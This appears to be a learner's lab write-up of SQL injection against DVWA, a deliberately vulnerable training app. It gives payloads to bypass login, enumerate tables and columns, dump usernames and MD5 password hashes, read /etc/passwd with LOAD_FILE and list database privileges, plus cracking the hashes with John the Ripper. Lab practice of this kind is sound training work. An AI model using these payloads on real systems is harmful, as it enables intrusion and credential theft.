# PHP Snippet


## What is PHP Snippet?
**PHP snippet** is just a small piece of PHP code — usually a few lines — that performs one task (print text, read a file, validate input, connect to a DB, etc.). People share snippets when they want to show a quick example, fix a bug, or reuse a tiny utility without sharing a whole project.


# PHP Snippet Methodology

## 1. Basic vulnerability Detection

### Check for Error-Based SQLI

In the User ID field, enter
````
1'
````
<img width="1281" height="801" alt="image" src="https://github.com/user-attachments/assets/9800d774-1572-44ce-a40e-b25d0d56bf84" />

- It will show error SQL syntax:
<img width="1161" height="178" alt="image" src="https://github.com/user-attachments/assets/7c5bb1aa-e6aa-4175-a18c-bad13884c8ad" />



### Basic Bypass
````
' OR '1'='1
````
<img width="899" height="741" alt="image" src="https://github.com/user-attachments/assets/83f0024a-f4e0-441b-861c-5b738ea28901" />

- The result we will see this:
<img width="900" height="785" alt="image" src="https://github.com/user-attachments/assets/9b6e4f29-bcb3-4b64-8091-228fdf688334" />

---


## Manual Exploitation - Information Gathering

### Find Number of Columns

- Using ORDER By:
````
1' ORDER BY 1-- -
````
<img width="901" height="736" alt="image" src="https://github.com/user-attachments/assets/4362d93a-7808-46d9-b142-98f9d361af08" />

<img width="897" height="737" alt="image" src="https://github.com/user-attachments/assets/e597eb75-e54c-4570-b159-b84c71b70cdd" />


````
1' ORDER BY 2-- -
````
<img width="900" height="738" alt="image" src="https://github.com/user-attachments/assets/d08b743e-ecfa-4b6f-9653-64b9e35e97a7" />

<img width="900" height="732" alt="image" src="https://github.com/user-attachments/assets/29273898-e0f8-4ea5-97b7-dc578315775f" />


````
1' ORDER BY 3-- -
````
<img width="899" height="593" alt="image" src="https://github.com/user-attachments/assets/fef7b554-6aa9-4fc5-99ab-f27f712bc01e" />

<img width="1139" height="195" alt="image" src="https://github.com/user-attachments/assets/0440f3d2-90d2-436c-bf3a-f62b99a5f6ff" />




###  Check Which Columns Are Visible
````
1' UNION SELECT 1,2-- -
````
<img width="896" height="736" alt="image" src="https://github.com/user-attachments/assets/b376409c-aad4-4a93-befd-93c1222735e7" />

<img width="900" height="736" alt="image" src="https://github.com/user-attachments/assets/886d7f84-b789-47a2-9cc5-cb0042b6e722" />

- We seee the result both columns are visible.


### Get Database Information
````
1' UNION SELECT version(),database()-- -
````
<img width="898" height="735" alt="image" src="https://github.com/user-attachments/assets/267f17f0-0bd2-43d6-8060-070522ab6d15" />

<img width="896" height="732" alt="image" src="https://github.com/user-attachments/assets/900037b3-3de4-45a1-b81b-e1b779ccc08e" />

- In this we see:
  - DataBase Version.
  - DataBase Name.
 

### Get Current User
````
1' UNION SELECT user(),current_user()-- -
````
<img width="897" height="733" alt="image" src="https://github.com/user-attachments/assets/282d6f0a-04a2-4abb-a9ae-c08fe5042ed3" />

<img width="901" height="740" alt="image" src="https://github.com/user-attachments/assets/b7014c3d-775e-4ad1-8895-02a3289789c7" />

---


##  EXTRACTING DATABASE STRUCTURE

### Get all table names
````
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
````
<img width="1042" height="738" alt="image" src="https://github.com/user-attachments/assets/7856c5ca-93c9-4817-965e-267812d539da" />


### Get Column Names from Users Table
````
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
````
<img width="1042" height="757" alt="image" src="https://github.com/user-attachments/assets/f403892a-5d37-4404-8741-980c3f6ac020" />

- In Columns in users table:
  - user_id
  - first_name
  - last_name
  - user
  - password
  - avatar

---


## EXTRACTING SENSITIVE DATA

### Get All Usernames and Passwords
````
1' UNION SELECT user,password FROM users-- -
````
<img width="892" height="782" alt="image" src="https://github.com/user-attachments/assets/84de289f-56be-42fc-82f3-990bb01f1b45" />

- In this we see `hash` and copy all of it and input to onefile `dvwa_hashes.txt`:
````
sudo mousepad dvwa_hashes.txt
````
````
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
````
<img width="414" height="173" alt="image" src="https://github.com/user-attachments/assets/1494d729-a0f5-493d-9ff0-fa053e3bd3bd" />

---


## 5. CRACKING THE PASSWORDS

### Go to online Hash crackers
- URL: https://crackstation.net/
- Paste the hashes one by one
- Get the plaintext passwords


### Using John The Ripper to crack 
````
john --format=raw-md5 dvwa.hashes.txt
````
<img width="1013" height="402" alt="image" src="https://github.com/user-attachments/assets/88cbced9-9987-4adc-bb2b-a6ef327444f3" />

- In this we was cracked the password.

---


## ADVANCED EXPLOITATION TECHNIQUES

### Extract All Data in One Query
````
1' UNION SELECT GROUP_CONCAT(user,0x3a,password),2 FROM users-- -
````
<img width="1262" height="502" alt="image" src="https://github.com/user-attachments/assets/3662d048-2cc2-451f-b4c7-7f131374a0d7" />

- `UNION SELECT GROUP_CONCAT(user,0x3a,password),2`: Appends a new result set that merges all usernames and passwords into a single string, separated by `:` (`90*3a` is hex for colon).
- `FROM users`: Targets the `users` table — assumed to contain login credentials.

### Read System Files (If Privileges Allow)
````
1' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
````
<img width="698" height="780" alt="image" src="https://github.com/user-attachments/assets/f980f8b8-717e-4345-b007-b4128767d4d4" />

- `UNION SELECT LOAD_FILE('/etc/passwd'),2`: Appends a new result set that attempts to read the contents of `/ETC/PASSWD/`. The second column (`2`) is a filler to match the expected column count.
- `-- -`: Comments out the rest of the original SQL query to prevent syntax errors.
- **This SQL injection payload attempts to read the contents of the server’s `/ETC/PASSWD` file using MySQL’s `load_file()` function. Here's a breakdown for your documentation or lab notes:**



### Get Database Users
````
1' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges-- -
````
<img width="648" height="794" alt="image" src="https://github.com/user-attachments/assets/682768fb-da3e-4c06-961a-963cfc02d777" />

- `UNION SELECT grantee, privilege_type`: Combines results from the original query with a new query that selects user privileges.
- `FROM information_schema.user_privileges`: Targets the metadata table that stores privilege mappings for all users.
- `-- -`: Comments out the rest of the original SQL query to avoid syntax errors.
- This is useful for:
  • 	Privilege escalation mapping
  • 	Identifying users with elevated access
  • 	Planning targeted exploitation (e.g., dumping data, modifying tables)


----



##  MEDIUM SECURITY EXPLOITATION

- In this i change my `Security Level` target to  `Medium` like this and click `Submit`:
<img width="974" height="715" alt="image" src="https://github.com/user-attachments/assets/e7c3f856-a3c5-4f3e-8b83-288e80722a43" />



### Exploitation Methods:

#### Direct Numeric Injection
- sinch no quote are used, we can inject directly:
````
1 OR 1=1
````
<img width="872" height="617" alt="image" src="https://github.com/user-attachments/assets/07e18f27-7f3f-4550-9685-ac1c9a5da3b1" />


#### Union Injection
````
1 UNION SELECT user,password FROM users
````
<img width="869" height="584" alt="image" src="https://github.com/user-attachments/assets/54feb8ea-d3a4-4e59-8ff4-69d8e7b4e669" />


----


## Finished Of PHP Snippet


---
## Pactice in LAB By: Nin Kanong (k4n0ng)
### Date: 24/10/2025
---
